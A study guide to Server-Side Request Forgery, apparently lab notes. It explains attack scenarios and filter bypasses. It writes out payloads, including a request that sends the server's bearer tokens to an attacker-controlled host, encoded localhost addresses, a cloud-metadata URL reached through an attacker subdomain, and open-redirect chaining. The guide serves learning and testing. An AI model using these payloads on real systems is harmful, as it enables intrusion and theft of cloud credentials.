# SSRF — Server-Side Request Forgery

## 🔍 Overview

**SSRF** is a vulnerability where an attacker tricks a web server into making HTTP requests on their behalf — to internal services, cloud metadata endpoints, or external attacker-controlled servers that the attacker could not directly reach themselves.

| Type | Description |
|------|-------------|
| **Regular SSRF** | The server's response is returned to the attacker — data is directly visible |
| **Blind SSRF** | The request is made but no output is returned — confirmed via out-of-band techniques (e.g. DNS callback to Burp Collaborator) |

> **Why it's dangerous:** The web server making the request often has access to internal networks, cloud metadata services, and internal APIs that are completely unreachable from the internet. The attacker inherits all of that access.

---

## 💥 Attack Scenarios

### Scenario 1 — Full URL Control

The attacker controls the entire URL passed in the parameter:

```
# Legitimate request
http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=124

# SSRF — attacker replaces the URL to target an internal endpoint
http://website.thm/stock?url=http://api.website.thm/api/user
```

**Attack flow:**
```
1. Attacker sends a modified request to the website
2. The website forwards the request to the attacker-supplied URL
3. The internal API server returns the requested data to the website
4. The website returns the data to the attacker
```

---

### Scenario 2 — Directory Traversal Control Only

The attacker can only control the path portion of the URL:

```
# Legitimate
http://website.thm/stock?url=/item?id=123

# SSRF — traverse to a different internal path
http://website.thm/stock?url=/../user
```

---

### Scenario 3 — Subdomain Control

The attacker controls the server subdomain component:

```
# Legitimate
http://website.thm/stock?server=api&id=123
→ resolves to: http://api.website.thm/api/stock/item?id=123

# SSRF — attacker replaces the subdomain
http://website.thm/stock?server=evil&id=123
→ resolves to: http://evil.website.thm/api/user&x=&id=123
```

> **`&x=`** is used to terminate the remaining path — anything after `&x=` becomes an additional parameter that the attacker's server ignores, preventing the original path from being appended and corrupting the injected URL.

---

### Scenario 4 — Credential/Token Harvesting

The attacker forces the web server to make a request to an attacker-controlled domain. The outbound request carries authentication headers (API keys, tokens, cookies) that the server normally uses to authenticate to internal services:

```
# SSRF — redirect request to attacker's server
http://website.thm/stock?url=http://attacker-domain.thm/

# The web server sends a request to attacker-domain.thm
# The attacker's server logs the incoming request headers
# → Authorization: Bearer eyJhbGc...  (API key / JWT captured)
```

---

## 🔎 Finding SSRF

SSRF entry points are anywhere user-supplied input is used to construct a server-side HTTP request.

| Location | Example |
|----------|---------|
| **URL parameter** | `http://website.com/form?server=http://internal.website.com` |
| **Hidden form field** | `<input type="hidden" name="server" value="http://server.website.com">` |
| **Partial URL (hostname only)** | `http://website.com/form?server=api` — server appends the rest |
| **Path component** | `http://website.com/form?dst=/forms/contact` |

> **Tip:** Use Burp Suite to inspect all parameters — SSRF entry points are often in hidden fields or background AJAX requests that aren't visible in the address bar. Look for parameters named `url`, `uri`, `src`, `dest`, `redirect`, `server`, `host`, `endpoint`, `path`, `callback`.

---

## 🛡️ Defeating SSRF Defences

Applications implement allow/deny lists to block SSRF — but these are frequently bypassable.

---

### 🚫 Deny Lists

All requests are accepted **except** those matching blocked entries — e.g. `localhost` and `127.0.0.1` are blocked to prevent access to internal services.

**Bypass techniques:**

| Bypass | Payload |
|--------|---------|
| Alternative localhost representations | `0`, `0.0.0.0`, `0000`, `127.1`, `127.0.1` |
| Decimal IP | `2130706433` (decimal of `127.0.0.1`) |
| Octal IP | `017700000001` |
| Wildcard bypass | `127.*.*.* ` |
| DNS resolving to localhost | `127.0.0.1.nip.io` — a public domain that resolves to the IP in the subdomain |
| Attacker-controlled subdomain | Register `internal.attacker.com` with a DNS A record pointing to `127.0.0.1` |

**Cloud metadata bypass:**

Cloud platforms expose instance metadata at `169.254.169.254` — containing credentials, IAM roles, and configuration. This IP is commonly blocked:

```
# Blocked
http://169.254.169.254/latest/meta-data/

# Bypass — register a subdomain that resolves to 169.254.169.254
http://metadata.attacker.com/latest/meta-data/
```

> AWS, GCP, and Azure all expose sensitive instance metadata at `169.254.169.254`. Successful SSRF to this endpoint can leak cloud credentials that grant access to the entire cloud environment.

---

### ✅ Allow Lists

All requests are **denied** except those matching explicitly permitted values — e.g. the URL must begin with `https://website.thm`.

**Bypass — subdomain on attacker's domain:**

```
# Rule: URL must start with https://website.thm
# Bypass: create a subdomain that starts with the required string

https://website.thm.attacker.com/malicious
          ↑
          Starts with https://website.thm — passes the prefix check
          But the actual domain is attacker.com
```

> This works when the rule checks for a prefix match (`startsWith`) rather than validating the actual domain. A proper implementation would parse the URL and validate the hostname independently.

---

### 🔀 Open Redirect

An **open redirect** is an endpoint that automatically redirects users to a URL supplied in a parameter:

```
http://website.thm/redirect?url=https://other-site.com
```

If this endpoint exists on the same server that's trusted by the SSRF target, the attacker can chain it:

```
# SSRF points to the open redirect, which redirects to the attacker's target
http://website.thm/stock?url=http://website.thm/redirect?url=http://internal-service/admin
```

**Why this bypasses restrictions:** The initial request goes to `website.thm` — which may be on an allow list or be a trusted origin. The server follows the redirect to the internal endpoint.

> Open redirects are useful for bypassing both allow lists (the initial URL is trusted) and deny lists (the redirect target isn't evaluated at the initial check stage).
